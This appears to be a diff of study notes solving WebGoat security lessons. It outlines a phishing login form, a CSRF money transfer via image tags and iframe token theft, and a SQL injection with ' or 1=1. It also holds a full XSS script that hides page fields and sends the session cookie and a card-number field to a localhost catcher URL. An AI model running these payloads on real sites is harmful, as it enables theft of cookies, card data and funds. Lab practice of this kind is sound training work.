@@ -1,8 +1,26 @@
+part1:
+create a fake login form such that when the user submits it, all the info is sent to the designated url.
+
+part2:
+get the cookie and user information from the webpage while hiding the contents of the message and field one to remain stealthy. Then send the information that is stolen, The following code was used and then encoded:
+<script>
+document.getElementById("message").style.display="none";
+document.getElementsByName("field1")[0].value="";
+var url = "http://localhost:8090/WebGoat/catcher?src=1406352188&menu=900&PROPERTY=yes&cookie="+document.cookie.split('=')[1]+"&card=" + document.getElementsByName("field2")[0].value;
+var noSpace = url.replace(/ /g,'');
+var xmlHttp = new XMLHttpRequest();
+xmlHttp.open("GET", noSpace, false);
+xmlHttp.send(null);
+</script>
+
 part3:
 input in title anything and in message the img which will transfer the money.
 
 part4:
 same as in part3, except add a confirm field in the 2nd image. 
+
+part5:
+create 2 iframes, the first contains the transfer fund screen. The 2nd one takes the token info from the first and confirms the transaction with this token.
 
 part6:
 close the SQL statement with ' and using an or 1=1 to always evaluate to true.
